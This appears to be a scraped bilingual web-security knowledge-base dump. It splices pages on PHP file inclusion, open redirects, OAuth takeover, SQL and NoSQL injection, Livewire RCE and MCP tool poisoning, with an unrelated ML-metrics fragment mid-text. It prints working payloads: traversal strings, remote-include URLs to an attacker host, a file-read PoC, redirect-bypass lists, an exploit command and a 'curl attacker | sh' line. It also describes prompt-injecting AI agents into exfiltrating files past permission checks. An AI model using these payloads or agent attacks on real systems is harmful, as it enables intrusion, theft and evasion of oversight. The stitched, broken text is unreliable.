data. title: PHP 代码审计
content: 来源路径： 02-知识点/Web安全/PHP 代码审计.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # PHP 代码审计 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 PHP 代码审计 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 PHP 代码审计 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：文件包含、本地文件包含、远程文件包含、文件上传、绕过上传检查；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 36 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 文件包含 本地文件包含 远程文件包含 文件上传 绕过上传检查 变量覆盖 全局变量覆盖 extract () 变量覆盖 import request variables 变量覆盖 parse str () 变量覆盖 命令执行 直接执行代码 preg replace () 代码执行 preg match 代码执行 构造 GET 读取 获取 GET 参数 传入参数 动态函数执行 # 核心要点 PHP：include ()，include once ()，require ()，require once ()，fopen ()，readfile () 等 JSP Servlet：ava.io.File ()，java.io.FileReader () 等 当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。 上述代码存在本地文件包含，可用 %00 截断的方式读取 /etc/passwd 文件内容。 需要 allow url fopen=On，allow url include=On 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。 文件上传漏洞是指用户上传了一个可执行脚本文件，并通过此文件获得了执行服器端命令的能力。在大多数情况下，文件上传漏洞一般是指上传 WEB 脚本能够被服务器解析的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够被 WEB 容器执行，其次用户能从 WEB 上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。 Content-Type 检测文件类型 /WEB-INF/web.xml ：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/database.properties ：数据库配置文件。 记一次拿 webshell 踩过的坑 (如何用 PHP 编写一个不包含数字和字母的后门) # 命令 / 载荷 / 操作片段 # 1. 本地文件包含 123456<?php$file = $_GET['file'];if (file_exists('/home/wwwrun/'.$file.'.php')) { include '/home/wwwrun/'.$file.'.php';}?> # 2. 本地文件包含 1?file=../../../../../../../../../etc/passwd%00 # 3. 本地文件包含 1?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././. # 4. 本地文件包含 1?file=../../../../../../../../../boot.ini/………[…]………… # 5. 远程文件包含 123456<?phpif ($route == "share") { require_once $basePath . "/action/m_share.php";} elseif ($route == "sharelink") { require_once $basePath . "/action/m_sharelink.php";} # 6. 远程文件包含 1/?basePath=http://attacker/phpshell.txt? # 7. 远程文件包含 1require_once "http://attacker/phpshell.txt?/action/m_share.php"; # 8. 远程文件包含 1?file=[http|https|ftp]://example.com/shell.txt # 9. 远程文件包含 1?file=php://input # 10. 远程文件包含 1?file=php://filter/convert.base64-encode/resource=index.php # 11. 远程文件包含 1?file=data://text/plain;base64,SSBsb3ZlIFBIUAo= # 12. 远程文件包含 1?file=http://127.0.0.1/path/xss.php?xss=phpcode # 13. 绕过上传检查 1234567location ~ \.php$ { root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; include fastcgi_param; } # 14. 全局变量覆盖 1register_globals=ON # 15. 全局变量覆盖 1234567<?phpecho "Register_globals: " . (int)ini_get("register_globals") . "<br/>";if ($auth) { echo "private!";}?> # 16. extract () 变量覆盖 1int extract ( array $var_array [, int $extract_type [, string $prefix ]] ) # 17. extract () 变量覆盖 12345678910<?php$auth = "0";extract($_GET);if ($auth == 1) { echo "private!";} else { echo "public!";}?> # 18. import request variables 变量覆盖 1bool import_request_variables (string $types [, string $prefix]) # 19. import request variables 变量覆盖 12345678910<?php$auth = "0";import_request_variables("G");if ($auth == 1) { echo "private!";} else { echo "public!";}?> # 20. parse str () 变量覆盖 1void parse_str ( string $str [, array &$arr ]) # 21. parse str () 变量覆盖 1234// var.php?var=new 变量覆盖$var = "init";parse_str($_SERVER["QUERY_STRING"]);print $var; # 22. 直接执行代码 123456789eval();assert();system();exec();shell_exec();passthru();escapeshellcmd();pcntl_exec();...... # 23. preg replace () 代码执行 1234<?php$var = "<tag>phpinfo()</tag>";preg_replace("/<tag>(.*?)＜\/tag>/e", "addslashes(\\1)", $var);?> # 24. preg match 代码执行 12345678910111213141516<?phpinclude 'flag.php';if(isset($_GET['code'])){ $code = $_GET['code']; if(strlen($code)>40){ die("Long."); } if(preg_match("/[A-Za-z0-9]+/",$code)){ die("NO."); } @eval($code);}else{ highlight_file(__FILE__);}//$hint = "php function getFlag() to get flag";?> # 25. preg match 代码执行 123<?php echo "A"^"?";?> # 26. preg match 代码执行 12345678<?php function B(){ echo "Hello Angel_Kitty"; } $_++; $__= "?" ^ "}"; $__();?> # 27. preg match 代码执行 123456789<?php @$_++; // $_ = 1 $__=("#"^"|"); // $__ = _ $__.=("."^"~"); // _P $__.=("/"^"`"); // _PO $__.=("|"^"/"); // _POS $__.=("{"^"/"); // _POST ${$__}!$_; // $_POST0;?> # 28. preg match 代码

Impact: Read arbitrary local files despite safe mode or open basedir restrictions (no direct code execution). From http://blog.safebuff.com/2016/05/06/disable-functions - 绕过 / This is a 文件读取 primitive. Combine with other primitives (log poisoning, session 文件包含，etc.) for further escalation when possible. CVE-2006-2563 (PHP 4.4.2/5.1.4): libcurl wrappers allowed file://access with embedded NULs to 绕过 open basedir; fixed before 5.2.x. You can wrap the 载荷 in a single HTTP request body to trigger the LFI through vulnerable server-side code that mirrors user-controlled URLs into curl exec () (common in legacy SSRF-like endpoints). # 命令 / 载荷 / 操作片段 # 1. One-liner PoC 1var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00".__FILE__))); # 2. More explicit PoC (arbitrary 文件读取) 12345678910111213141516<?php// Preconditions (legacy): PHP 5.2.4/5.2.5, safe_mode or open_basedir enabled, ext/curl loaded$target = '/etc/passwd'; // change to the file you want to read$ch = curl_init();// The trick is the NUL byte (\x00). Prefix can be any string; checks are confused and the file after the NUL is read.curl_setopt($ch, CURLOPT_URL, 'file://prefix'.chr(0).$target);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);$resp = curl_exec($ch);$err = curl_error($ch);curl_close($ch);if ($resp !== false) { echo $resp; // should contain the target file} else { echo "cURL error: $err\n";}?> # 工具与参考入口 Ubuntu CVE entry with patch pointers and affected versions Technical writeup with code context (cxsecurity) PHP bug #36223 (curl bypasses open basedir) CVE-2006-2563 cURL PHP File Access 绕过 (earlier NUL-byte issue) # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

If you are targeting HTML-to-PDF generators or server-side PDF creation bugs, check the more specific pages about HTML-to-PDF file reads and ReportLab/xhtml2pdf RCE. Acrobat / Reader → richest JavaScript API surface (submitForm, getPageNthWord, form actions, etc.) Seeing app.alert(1) only proves that the viewer executes some embedded PDF JavaScript / actions. content: 来源路径： 02-知识点/Web安全/Open URL Redirect 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Open URL Redirect 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 Open URL Redirect 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 Open URL Redirect 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Open URL Redirect、方法论、HTTP Redirection Status Code、Redirect Methods、Path-based Redirects；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 15 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Open URL Redirect 方法论 HTTP Redirection Status Code Redirect Methods Path-based Redirects JavaScript-based Redirects Common Query Parameters Filter 绕过 # 核心要点 An 开放重定向 漏洞 occurs when a web application or server uses unvalidated, user-supplied input to redirect users to other sites. This can allow an attacker to craft a link to the vulnerable site which redirects to a malicious site of their choosing. Attackers can leverage this 漏洞 in phishing campaigns, session theft, or forcing a user to perform an action without their consent. An attacker could 利用 an 开放重定向 here by replacing the userpreferredsite.com with a link to a malicious website. They could then distribute this link in a phishing email or on another website. When users click the link, they're taken to the malicious website. If the application uses JavaScript for redirects, attackers may manipulate script variables: 载荷: ?redirectTo=http://malicious.com Using CRLF to 绕过 "javascript" blacklisted keyword Using "//" and "////" to 绕过 "http" blacklisted keyword Using "https:" to 绕过 "//" blacklisted keyword Using "//" to 绕过 "//" blacklisted keyword Using "% E3%80%82" to 绕过 "." blacklisted character Using null byte "%00" to 绕过 blacklist filter # 命令 / 载荷 / 操作片段 # 1. 方法论 1https://example.com/redirect?url=https://userpreferredsite.com # 2. JavaScript-based Redirects 12var redirectTo = "http://trusted.com";window.location = redirectTo; # 3. Common Query Parameters 123456789101112131415161718192021?checkout_url={payload}?continue={payload}?dest={payload}?destination={payload}?go={payload}?image_url={payload}?next={payload}?redir={payload}?redirect_uri={payload}?redirect_url={payload}?redirect={payload}?return_path={payload}?return_to={payload}?return={payload}?returnTo={payload}?rurl={payload}?target={payload}?url={payload}?view={payload}/{payload}/redirect/{payload} # 4. Filter 绕过 1www.whitelisted.com.evil.com redirect to evil.com # 5. Filter 绕过 1java%0d%0ascript%0d%0a:alert(0) # 6. Filter 绕过 12//google.com ////google.com # 7. Filter 绕过 1https:google.com # 8. Filter 绕过 12\/\/google.com/ /\/google.com/ # 9. Filter 绕过 12/?redir=google。com //google%E3%80%82com # 10. Filter 绕过 1//google%00.com # 11. Filter 绕过 1?next=whitelisted.com&next=google.com # 12. Filter 绕过 12//<user>:<password>@<host>:<port>/<url-path> http://www.theirsite.com@yoursite.com/ # 13. Filter 绕过 12http://www.yoursite.com/http://www.theirsite.com/ http://www.yoursite.com/folder/www.folder.com # 14. Filter 绕过 12http://www.yoursite.com?http://www.theirsite.com/ http://www.yoursite.com?folder/www.folder.com # 15. Filter 绕过 12https://evil.c℀.example.com . ---> https://evil.ca/c.example.com http://a.com／X.b.com # 工具与参考入口 300 Multiple Choices 301 Moved Permanently 302 Found 303 See Other 304 Not Modified 305 Use Proxy 307 Temporary Redirect 308 Permanent Redirect Common Internet Scheme Syntax Root Me：HTTP：开放重定向 PortSwigger：DOM-based open redirection 开放重定向 速查：PentesterLand：November 2, 2018 开放重定向 漏洞：s0cket7：August 15, 2018 Open-Redirect - 载荷：Predrag Cujanović：April 24, 2017 Unvalidated Redirects and Forwards 速查：OWASP：February 28, 2024 # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/Web安全/OAuth to Account takeover 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # OAuth to Account takeover 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 OAuth to Account takeover 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 OAuth to Account takeover 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：OAuth to Account takeover、Basic Information <a href="#d4a8" id="d4a8"></a>、Flow、Vulnerabilities <a href="#id-323a" id="id-323a"></a>、开放重定向 uri <a href="#cc36" id="cc36"></a>；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 9 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 OAuth to Account takeover Basic Information <a href="#d4a8" id="d4a8"></a> Flow Vulnerabilities <a href="#id-323a" id="id-323a"></a> 开放重定向 uri <a href="#cc36" id="cc36"></a> Redirect 令牌 leakage on allowlisted domains with attacker-controlled subpaths XSS in redirect implementation <a href="#bda5" id="bda5"></a> OAuth callback error pages: reflected error description, trusted-origin phishing, and encoded state leakage CSRF：Improper handling of state parameter <a href="#bda5" id="bda5"></a> Pre Account Takeover <a href="#ebe4" id="ebe4"></a> Disclosure of Secrets <a href="#e177" id="e177"></a> Client Secret Bruteforce Referer/Header/Location artifacts leaking Code + State Access 令牌 Stored in Browser History Everlasting 授权 Code 授权 / Refresh 令牌 not bound to client Happy Paths, XSS, Iframes & Post Messages to leak code & state values AWS Cognito <a href="#bda5" id="bda5"></a> # 核心要点 resource server: The server managing authenticated requests after the application has secured an access 令牌 on behalf of the resource owner, e.g., https://socialmedia.com. 授权 server: The server that issues access tokens to the client application following the successful 认证 of the resource owner and securing 授权，e.g., https://socialmedia.com. client secret: A confidential key, known solely to the application and the 授权 server, used for generating access tokens. response type: A value specifying the type of 令牌 requested, like code. grant type: A parameter indicating the grant type and the type of 令牌 to be returned. code: The 授权 code from the 授权 server, used in tandem with client id and client secret by the client application to acquire an access 令牌. access 令牌: The 令牌 that the client application uses for API requests on behalf of the resource owner. refresh 令牌: Enables the application to obtain a new access 令牌 without re-prompting the user. Weak substring/regex checks on the host – 绕过 with lookalikes such as evilmatch.com, match.com.evil.com, match.com.mx, matchAmatch.com, evil.com#match.com, or match.com@evil.com. IDN homograph mismatches – validation happens on the punycode form (xn--), but the browser redirects to the Unicode domain controlled by the attacker. Arbitrary paths on an allowed host – pointing redirect uri to /openredirect?next=https://attacker.tld or any XSS/user-content endpoint leaks the code either through chained redirects, Referer headers, or injected JavaScript. Directory constraints without normalization – patterns like /oauth/* can be bypassed with /oauth/../anything. Non-HTTPS callbacks – letting http:// URIs through gives network attackers (Wi-Fi, corporate proxy) the opportunity to snatch the code in transit. Reflecting error description into HTML without strict output encoding turns the callback into a trusted-origin phishing page. Even when <script> is filtered, HTML injection can still spoof the entire failure page and instruct the victim to perform attacker-chosen actions. # 命令 / 载荷 / 操作片段 # 1. Flow 123456https://socialmedia.com/auth?response_type=code&client_id=example_clientId&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&scope=readPosts&state=randomString123 # 2. Flow 1https://example.com?code=uniqueCode123&state=randomString123 # 3. Flow 123POST /oauth/access_tokenHost: socialmedia.com...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"} # 4. Are there any OAuth implementations on the site? If so, setup an img tag to your server and see if there's a way to get the victim there (redirect, etc.) after login to steal OAuth tokens via referer：@abugzlife1 Redirect to a controlled domain to get the access 令牌 Redirect to an accepted Open URL in to get the access 令牌 Sometimes you need to change the scope to an invalid one to 绕过 a filter on redirect uri: and SHOULD revoke (when possible) all tokens previously issued based on that 授权 code. Applications that do not check for a valid CSRF 令牌 in the OAuth callback are vulnerable. This can be exploited by initializing the OAuth flow and intercepting the callback (https://example.com/callback?code = 授权 CODE). This URL can be used in CSRF attacks. # 命令 / 载荷 / 操作片段 # 1. NoSQL 注入 occurs when an attacker manipulates queries by injecting malicious input into a NoSQL database query. Unlike SQL 注入，NoSQL 注入 often exploits JSON-based queries and operators like $ne, $gt, $regex, or $where in MongoDB. An attacker can inject a NoSQL query: { "$gt": 0 }. Basic 认证 绕过 using not equal (ne)orgreater(ne) or greater (ne)orgreater(gt) The exploits are based in adding an Operator: Using the $func operator of the MongoLite library (used by default) it might be possible to execute and arbitrary function as in this report. It's possible to use $lookup to get info from a different collection. In the following example, we are reading from a different collection called users and getting the results of all the entries with a 密码 matching a wildcard. If the application only leaks the first failing document, keep the dump deterministic by excluding documents you already recovered. Comparing against the last leaked id is an easy paginator: When the application builds the Mongo filter as a string before parsing it, syntax injection is no longer limited to a single field and you can often neutralize surrounding conditions. In $where injections, JavaScript truthy values and poison null bytes are still useful to kill trailing clauses: https://github.com/an0nlk/Nosql-MongoDB-injection-username - 密码 - 枚举 https://github.com/C4l1b4n/NoSQL-Attack-Suite # 命令 / 载荷 / 操作片段 # 1. While Next.js provides a secure foundation, improper coding practices can introduce vulnerabilities. Key client-side vulnerabilities include: XSS attacks occur when malicious scripts are injected into trusted websites. Attackers can execute scripts in users' browsers, stealing data or performing actions on behalf of the user. Example of Vulnerable Code: Why It's Vulnerable: Using dangerouslySetInnerHTML with untrusted input allows attackers to inject malicious scripts. <summary>Client-Side Template Injection</summary> Why It's Vulnerable: If template or data includes malicious content, it can lead to execution of unintended code. Malicious Input: The attacker crafts a URL with a manipulated filePath such as ../deleteFile/config.json. Crafted Link: The attacker sends the victim a link or embeds a malicious script that triggers the 下载 request with the manipulated filePath. Outcome: The victim unknowingly executes the action, leading to unauthorized file access or deletion. Potential API Actions: If the API endpoint performs state-changing actions (e.g., delete, modify files), it can be exploited via CSPT. Wide Method Allowance: Allowing all methods can enable attackers to perform unwanted actions. How attackers 利用 it: Purpose: Executes code in the server-side serverless function before a request is processed, allowing for tasks like 认证，redirects, or modifying responses. # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/Web安全/MySQL Injection 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # MySQL Injection 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 MySQL Injection 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 MySQL Injection 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：MySQL Injection、MYSQL Default Databases、MYSQL Comments、MYSQL Testing Injection、MYSQL Union Based；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 53 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 MySQL Injection MYSQL Default Databases MYSQL Comments MYSQL Testing Injection MYSQL Union Based Detect Columns Number Iterative NULL Method ORDER BY Method LIMIT INTO Method Extract Database With Information Schema Extract Columns Name Without Information Schema Extract Data Without Columns Name MYSQL Error Based MYSQL Error Based：Basic MYSQL Error Based：UpdateXML Function MYSQL Error Based：Extractvalue Function MYSQL Error Based：NAME CONST function (only for constants) MYSQL Blind # 核心要点 Login: Query like SELECT * FROM Users WHERE username = 'FUZZ1' AND 密码 = 'FUZZ2'; To successfully perform a union-based SQL 注入，an attacker needs to know the number of columns in the original query. Systematically increase the number of columns in the UNION SELECT statement until the 载荷 executes without errors or produces a visible change. Each iteration checks the compatibility of the column count. In the UNION based SQL 注入，you can SELECT arbitrary data to display on the page: -1' UNION SELECT 1,2,3--+. This method is effective when error reporting is enabled. It can help determine the number of columns in cases where the injection point occurs after a LIMIT clause. Injection example inside the query select author id,title from posts where author id=[INJECT HERE] INFO : The text of the statement being executed, or NULL if no statement is being executed. /!12345UNION/: This means that the word UNION will be executed as part of the SQL statement if the MySQL version is 12.345 or higher. /!31337SELECT/: Similarly, the word SELECT will be executed if the MySQL version is 31.337 or higher. from https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection - 载荷 / Remember that in "modern" versions of MySQL you can substitute " information schema.tables " for " mysql.innodb table stats " (This could be useful to 绕过 WAFs). Learn here different options to abuse a Mysql injection to obtain a SSRF**.** When stacked queries are allowed, it might be possible to 绕过 WAFs by assigning to a variable the hex representation of the query you want to execute (by using SET), and then use the PREPARE and EXECUTE MySQL statements to ultimately execute the query. Something like this: More info in https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952 Some applications sanitise or parse user input with functions such as sscanf("%128s", buf) which stop at the first space character. Useful to build oracles such as “does any row contain a term with prefix X?” and to enumerate hidden strings via prefix expansion. If Boolean mode is required, strip or neutralize all Boolean operators (+：* " () < > ~) for every 令牌 (no early breaks) after tokenization. This SSRF method is limited to TCP port 445 and does not permit port number modification, though it can be used to access shares with full read privileges and, as demonstrated in prior research, to steal hashes for further 利用. This technique allows for the execution of network/HTTP requests through a UDF, provided several conditions are met, including write access to the @@plugin dir, file priv set to Y, and secure file priv disabled. Automation of these processes can be facilitated by 工具 such as SQLMap, which supports UDF injection, and for blind SQL injections, output redirection or DNS HTTP 请求走私 techniques may be utilized. # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 SQL 注入 SSRF 服务端请求伪造 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Filtering Outliers: Detecting and removing outliers that may skew the model's performance. Techniques like Z-score, IQR (Interquartile Range), or visualizations (e.g., box plots) can be used to identify outliers. Hashing Encoding: Using a 哈希 function to convert categories into fixed-size vectors, which can be useful for high-cardinality categorical variables. For example, if a feature has many unique categories, hashing can reduce the dimensionality while preserving some information about the categories. Recall is crucial in scenarios where false negatives are costly or undesirable, such as in disease 检测 or spam filtering. For example, if a model identifies 80 out of 100 actual positive instances, the recall would be 0.8 (80%). # 命令 / 载荷 / 操作片段 # 1. Specificity 1Specificity = (True Negatives) / (True Negatives + False Positives) # 6. Matthews Correlation Coefficient (MCC) 1MCC = (TP * TN - FP * FN) / sqrt((TP + FP) * (TP + FN) * (TN + FP) * (TN + FN)) # 7. If you need to reactivate xp cmdshell, it is disabled by default in SQL Server 2005. Executed by a different user than the one using xp cmdshell to execute commands MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the xp dirtree function to list the files in our SMB share and grab the NTLMv2 哈希. MS Access always requires that in subqueries or extra queries a FROM is indicated.\ So, if you want to execute a UNION SELECT or UNION ALL SELECT or a SELECT between parenthesis in a condition, you always need to indicate a FROM with a valid table name.\ MS Access allows weird syntax such as '1'=2='3'='asd'=false. As usually the SQL 注入 will be inside a WHERE clause we can abuse that. We have already discussed the chaining equals technique to dump data from the current and other tables. But there are other ways: a SMB share behind a high-latency link However, note that is very typical to find SQL Injections where you don't have access to read the table MSysObjects. Out-of-band exfiltration of Net-NTLMv2 hashes (usable for relay or offline cracking). Potential remote code execution if a new Jet/ACE parser bug is exploited. Block outbound SMB/WebDAV at the network boundary. We decorated the function with @mcp.tool() to register it as a callable tool for connected LLMs. To run the server, execute it in a terminal: python3 calculator.py For more information about Prompt Injection check: MCP Security Notification: Tool Poisoning Attacks Jumping the line: How MCP servers can attack you before you ever use them A malicious actor could add inadvertently harmful 工具 to an MCP server, or just change the description of existing 工具，which after being read by the MCP client, could lead to unexpected and unnoticed behavior in the AI model. This description would be read by the AI model and could lead to the execution of the curl command, exfiltrating sensitive data without the user being aware of it. For legacy versions you can detect suspicious diffs with Git hooks or a security agent watching .cursor/ paths. Because the regexes never match these forms, checkPermissions returns Allow and the LLM executes them without user approval. Writing to startup files such as ~/.zshenv yields persistent RCE: the next interactive zsh session executes whatever 载荷 the sed write dropped (e.g., curl https://attacker/p.sh | sh). The same 绕过 reads sensitive files (~/.aws/ 凭据，SSH keys, etc.) and the agent dutifully summarizes or exfiltrates them via later tool calls (WebFetch, MCP resources, etc.). An attacker only needs a prompt-injection sink: a poisoned README, web content fetched through WebFetch, or a malicious HTTP-based MCP server can instruct the model to invoke the “legitimate” sed command under the guise of log formatting or bulk editing. Even when JSON is supplied instead of a string, Flowise simply forwards the attacker-controlled command/args into the helper that launches local MCP binaries. Without RBAC or default 凭据，the server happily runs arbitrary binaries (CVE-2025-8943 / GHSA-2vv2-3x8x-4gv7). Auth handling: connection profiles inject bearer tokens, custom headers/params, or mTLS client certs before forwarding, removing the need to hand-edit auth per replay. Endpoint selection: auto-detects SSE vs WebSocket endpoints and lets you override manually (SSE is often unauthenticated while WebSockets commonly require auth). # 命令 / 载荷 / 操作片段 # 1. Therefore any attacker that knows the 32-byte secret APP KEY can craft an encrypted PHP serialized object and gain RCE via magic methods ( wakeup, destruct, …). Inject the produced string into any vulnerable decrypt() sink (route param, cookie, session, …). The script transparently supports both CBC and GCM 载荷 and re-generates the HMAC/tag field. Every POST to /livewire/update rehydrates the JSON snapshot server-side and executes the queued calls/updates. Anyone holding APP KEY (used to derive $hashKey) can therefore forge arbitrary snapshots by recomputing the HMAC. This recursive design makes Livewire a generic object-instantiation engine once an attacker controls either the tuple metadata or any nested tuple processed during recursion. Inject nested tuples that point to gadget classes and recompute checksum = 哈希 hmac ('sha256', json encode (snapshot without checksum), APP KEY). Re-encode the snapshot, keep 令牌 /memo untouched, and replay the request. Queueable trait – any object using Illuminate\Bus\Queueable exposes public chainedandexecutesunserialize(arrayshift(chained and executes unserialize(array shift(chainedandexecutesunserialize(arrayshift(this->chained)) in dispatchNextJobInChain(). getMetaForPath() trusts whichever synth metadata already existed for that property even if the attacker previously forced it to become a tuple via weak typing. The snapshot already contains something like {"form":[{...},{"s":"form","class":"App\Livewire\Forms\LoginForm"}]}. An attacker can send updates.form with nested malicious tuples directly, because recursion will eventually reinterpret children such as [载荷，{"s":"clctn","class":"GuzzleHttp\Psr7\FnStream"}]. This is why pre-auth Livewire entrypoints that expose FormObjectSynth objects are especially attractive: they already provide both instantiation and public-property assignment. Nested updates are revalidated against the original raw snapshot path instead of trusting fresh attacker-supplied tuple metadata. Fingerprints the deployed Livewire version by parsing <script src="/livewire/livewire.js?id = 哈希"> (or ?v = 哈希) and mapping the 哈希 to vulnerable releases. Generates either an updates-only 载荷 (CVE-2025-54068) or a forged snapshot (known APP KEY) embedding the phpggc chain. # 命令 / 载荷 / 操作片段 # 1. Recap of the Livewire state machine 12345678910111213class Checksum { static function verify($snapshot) { $checksum = $snapshot['checksum']; unset($snapshot['checksum']); if ($checksum !== self::generate($snapshot)) { throw new CorruptComponentPayloadException; } } static function generate($snapshot) { return hash_hmac('sha256', json_encode($snapshot), $hashKey); }} # 2. Recap of the Livewire state machine 12345678protected function hydrate($valueOrTuple, $context, $path){ if (! Utils::isSyntheticTuple($value = $tuple = $valueOrTuple)) return $value; [$value, $meta] = $tuple; $synth = $this->propertySynth($meta['s'], $context, $path); return $synth->hydrate($value, $meta, fn ($name, $child) => $this->hydrate($child, $context, "{$path}.{$name}"));} # 3. Automating snapshot forgery 12./laravel_crypto_killer.py exploit -e livewire -k base64:APP_KEY \ -j request.json --function system -p "bash -c 'id'" # 4. CVE-2025-54068 – RCE without APP KEY 1234567protected function hydrateForUpdate($raw, $path, $value, $context){ $meta = $this->getMetaForPath($raw, $path); if ($meta) { return $this->hydrate([$value, $meta], $context, $path); }} # 5. If session. 上传 progress.enabled is On and you provide the PHP SESSION 上传 PROGRESS in multipart POST data, PHP will enable the session for you. Note that with PHP SESSION 上传 PROGRESS you can control data inside the session, so if you includes your session file you can include a part you control (a php shellcode for example). In the original CTF where this technique is commented, it wasn't enough to 利用 the 条件竞争 but the content loaded needed to start also with the string @<?php. Due to the default setting of session. 上传 progress.prefix, our SESSION file will start with a annoying prefix 上传 progress Such as: 上传 progress controlledcontentbyattacker More information in the original writeup https://blog.orange.tw/2018/10/and final 利用 https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2018/one-line-php-challenge/exp for php.py\ Another writeup in https://spyclub.tech/2018/12/21/one-line-and-return-of-one-line-php-writeup/ # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/Web安全/LFI2RCE via PHP Filters 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # LFI2RCE via PHP Filters 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 LFI2RCE via PHP Filters 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 LFI2RCE via PHP Filters 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：LFI2RCE via PHP Filters、Intro、How to add also suffixes to the resulting data、Automatic 工具、Full script；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 LFI2RCE via PHP Filters Intro How to add also suffixes to the resulting data Automatic 工具 Full script Improvements Advanced Filter Chains in Practice Error-based filter oracles (php filter chains oracle 利用) Lightyear digit-set jumps & chunk pruning # 核心要点 This writeup explains that you can use php filters to generate arbitrary content as output. Which basically means that you can generate arbitrary php code for the include without needing to write it into a file. Basically the goal of the script is to generate a Base64 string at the beginning of the file that will be finally decoded providing the desired 载荷 that will be interpreted by include. This writeup explains how you can still abuse PHP filters to add suffixes to the resulting string. This is great in case you need the output to have some 